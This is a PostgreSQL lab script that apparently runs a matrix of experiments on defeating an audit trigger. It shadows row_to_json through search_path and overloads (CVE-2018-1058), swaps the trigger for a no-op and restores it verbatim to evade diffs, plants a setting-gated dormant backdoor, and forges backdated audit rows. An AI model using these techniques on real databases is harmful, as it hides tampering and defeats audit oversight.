-- 20_attacks.sql — catalogue of every attack vector, each guarded by a psql var
-- so run_matrix.sh activates exactly ONE per Feasibility-Matrix cell:
--   -v run_1A=on   plain search_path shadow of a pg_catalog built-in (row_to_json)
--   -v run_1B=on   writable public: EXACT overload public.row_to_json(app.accounts) beats the record built-in
--   -v run_1C=on   direct replacement of the trigger fn (ownership misconfig)
--   -v run_2G=on   GUC-gated dormant trigger bypass (Experiment 2)
--   -v run_3P=on   attribution poisoning from within (Experiment 3)
--
-- Runs as app_role (the simulated SQLi context) unless the harness says otherwise.
-- Each block plants a uniquely-named sentinel write so the DBA can measure, out of
-- band, whether that write was captured by the auditor.
--
-- NB: ON_ERROR_STOP is intentionally left to the caller (run_matrix.sh runs attacks
-- with it OFF) so that a blocked precondition — e.g. the attacker cannot CREATE in a
-- hardened schema — is recorded and the sentinel write still executes; the out-of-band
-- audit-count measurement is the ground truth of whether blinding occurred.

-- default all guards off for standalone runs
\if :{?run_1A} \else \set run_1A off \endif
\if :{?run_1B} \else \set run_1B off \endif
\if :{?run_1C} \else \set run_1C off \endif
\if :{?run_2G} \else \set run_2G off \endif
\if :{?run_3P} \else \set run_3P off \endif
\if :{?run_1S} \else \set run_1S off \endif
\if :{?run_1T} \else \set run_1T off \endif
\if :{?run_1R2} \else \set run_1R2 off \endif

\c labdb

------------------------------------------------------------------------------
-- Vector 1A — plain search_path shadow of a pg_catalog built-in
-- Prediction: FAILS on defaults; pg_catalog is searched implicitly first.
------------------------------------------------------------------------------
\if :run_1A
  \echo '>>> Vector 1A: planting evil.row_to_json and prepending it to search_path'
  CREATE SCHEMA IF NOT EXISTS evil AUTHORIZATION app_role;
  SET search_path = evil, pg_catalog, public;
  CREATE OR REPLACE FUNCTION evil.row_to_json(anyelement) RETURNS json AS $$
    SELECT NULL::json;                       -- would blind capture if ever chosen
  $$ LANGUAGE sql;
  -- sentinel write; the AFTER trigger runs audit.if_modified() and resolves row_to_json
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-1A', 100);
\endif

------------------------------------------------------------------------------
-- Vector 1B — writable public + best-typed-match overload public.row_to_json(record)
-- Tests whether an attacker overload in public is ever preferred over the built-in.
------------------------------------------------------------------------------
\if :run_1B
  \echo '>>> Vector 1B: planting the EXACT composite-type overload public.row_to_json(app.accounts)'
  -- requires PUBLIC CREATE on public (pub_create=on). The catalog only has
  -- row_to_json(record); an exact match on the app.accounts rowtype is MORE specific,
  -- so PostgreSQL function resolution can prefer it even though pg_catalog is searched
  -- first (schema order is only a tie-breaker AFTER type specificity). This is the real
  -- CVE-2018-1058 shape and only bites when the DEFINER trigger fn is UNPINNED.
  CREATE OR REPLACE FUNCTION public.row_to_json(app.accounts) RETURNS json AS $$
    SELECT NULL::json;                        -- blinds row_data if chosen
  $$ LANGUAGE sql;
  SET search_path = public, pg_catalog;       -- attacker's session path (unpinned fn inherits it)
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-1B', 100);
\endif

------------------------------------------------------------------------------
-- Vector 1C — direct replacement of the trigger fn (ownership misconfig)
-- Requires app_owns=on. Replace body with a no-op, write, then RESTORE (RQ2).
------------------------------------------------------------------------------
\if :run_1C
  \echo '>>> Vector 1C: capture original def, replace with no-op, blind a write, then replay original VERBATIM'
  -- A careful attacker first captures the EXACT original source (pg_proc.prosrc is world-
  -- readable and stored verbatim), so the later restore is byte-identical -> a source-diff
  -- scanner finds nothing. This tests the STRONG RQ2 zero-residue claim.
  CREATE TEMP TABLE _orig AS
    SELECT pg_get_functiondef('audit.if_modified()'::regprocedure) AS d;
  -- blind
  CREATE OR REPLACE FUNCTION audit.if_modified() RETURNS trigger AS $$
  BEGIN RETURN COALESCE(NEW, OLD); END;       -- logs nothing
  $$ LANGUAGE plpgsql;
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-1C', 100);  -- unlogged
  -- restore the captured definition VERBATIM (\gexec runs the returned text as SQL)
  SELECT d FROM _orig \gexec
  -- control write AFTER restore should be logged again
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-1C-ctl', 101);
\endif

------------------------------------------------------------------------------
-- Experiment 2 — GUC-gated dormant trigger bypass. Requires app_owns=on.
-- Graft a session-flag skip; writes with the flag set are silently dropped,
-- writes without it are logged normally (selective dormancy in ONE session).
------------------------------------------------------------------------------
\if :run_2G
  \echo '>>> Experiment 2: grafting current_setting-gated dormant skip'
  CREATE OR REPLACE FUNCTION audit.if_modified() RETURNS trigger AS $$
  DECLARE payload jsonb;
  BEGIN
    IF current_setting('app.maint', true) = '1' THEN
       RETURN COALESCE(NEW, OLD);             -- dormant backdoor: silent skip
    END IF;
    IF (TG_OP='DELETE') THEN payload := row_to_json(OLD)::jsonb;
    ELSE payload := row_to_json(NEW)::jsonb; END IF;
    INSERT INTO audit.logged_actions(table_name, action, row_data)
    VALUES (TG_TABLE_NAME, left(TG_OP,1), payload);
    RETURN COALESCE(NEW, OLD);
  END; $$ LANGUAGE plpgsql;
  -- flag ON -> should NOT be logged
  SET app.maint = '1';
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-2G-gated', 200);
  -- flag OFF -> should be logged (proves selectivity, not a blanket break)
  RESET app.maint;
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-2G-ctl', 201);
\endif

------------------------------------------------------------------------------
-- Experiment 3 — attribution poisoning from within. Requires a broad INSERT grant
-- on audit.logged_actions (harness grants it as SU to model the misconfig).
------------------------------------------------------------------------------
\if :run_3P
  \echo '>>> Experiment 3: fabricating a synthetic false identity in the audit table'
  INSERT INTO audit.logged_actions(table_name, action, row_data, changed_by, client_ip, logged_at)
  VALUES ('accounts','U','{"note":"sentinel-3P-decoy"}'::jsonb,
          'ghost_user_42',                    -- non-existent user
          '203.0.113.77'::inet,               -- RFC 5737 documentation IP (fake)
          now() - interval '3 days');         -- backdated decoy
\endif

------------------------------------------------------------------------------
-- Vector 1S — SAME-SIGNATURE overload in a public schema placed BEFORE pg_catalog.
-- This is CVE-2018-1058 proper (schema ordering), and it is the cell that VALIDATES the
-- corrected 1A explanation: 1A did not fail because "pg_catalog always wins" — it failed
-- because a fresh role cannot CREATE a schema. Given writable public and a caller path with
-- public first, a same-signature shadow DOES blind. Requires pub_create=on, pin=off.
------------------------------------------------------------------------------
\if :run_1S
  \echo '>>> Vector 1S: same-signature public.row_to_json(record), public BEFORE pg_catalog'
  -- plpgsql (SQL-language functions cannot take a record parameter):
  CREATE OR REPLACE FUNCTION public.row_to_json(record) RETURNS json AS $$
  BEGIN RETURN NULL::json; END;               -- nulls captured payload if chosen
  $$ LANGUAGE plpgsql;
  SET search_path = public, pg_catalog;       -- public first (CVE-2018-1058 ordering)
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-1S', 100);
\endif

------------------------------------------------------------------------------
-- Vector 1T — TYPE-SPECIFICITY ISOLATION: exact-rowtype overload with pg_catalog placed
-- EXPLICITLY FIRST. If this still blinds, PostgreSQL's best-type-match (exact app.accounts
-- overload) beats the generic row_to_json(record) built-in EVEN THOUGH pg_catalog is first,
-- isolating the type-specificity mechanism from mere schema ordering. Requires pub=on, pin=off.
------------------------------------------------------------------------------
\if :run_1T
  \echo '>>> Vector 1T: exact overload public.row_to_json(app.accounts), pg_catalog FIRST'
  CREATE OR REPLACE FUNCTION public.row_to_json(app.accounts) RETURNS json AS $$
    SELECT NULL::json;
  $$ LANGUAGE sql;
  SET search_path = pg_catalog, public;       -- pg_catalog EXPLICITLY first
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-1T', 100);
\endif

------------------------------------------------------------------------------
-- Vector 1R2 — SEMANTIC (non-verbatim) restore: the RQ2 negative control. A careless
-- attacker restores a behaviourally-identical but reformatted body (no source capture).
-- Because pg_proc.prosrc stores source verbatim, the restored function's definition differs
-- from the original -> an object diff DETECTS it (contrast with the verbatim-replay 1C).
-- Requires app_owns=on.
------------------------------------------------------------------------------
\if :run_1R2
  \echo '>>> Vector 1R2: blind, then SEMANTIC (reformatted) restore -> detectable source diff'
  CREATE OR REPLACE FUNCTION audit.if_modified() RETURNS trigger AS $$
  BEGIN RETURN COALESCE(NEW, OLD); END;
  $$ LANGUAGE plpgsql;
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-1R2', 100);  -- unlogged
  -- behaviourally identical, but different source text (compact, no comments):
  CREATE OR REPLACE FUNCTION audit.if_modified() RETURNS trigger AS $$
  DECLARE p jsonb; BEGIN
    IF TG_OP='DELETE' THEN p:=row_to_json(OLD)::jsonb; ELSE p:=row_to_json(NEW)::jsonb; END IF;
    INSERT INTO audit.logged_actions(table_name,action,row_data) VALUES(TG_TABLE_NAME,left(TG_OP,1),p);
    RETURN COALESCE(NEW,OLD); END; $$ LANGUAGE plpgsql SECURITY DEFINER;
  INSERT INTO app.accounts(holder, balance_cents) VALUES ('sentinel-1R2-ctl', 101);
\endif
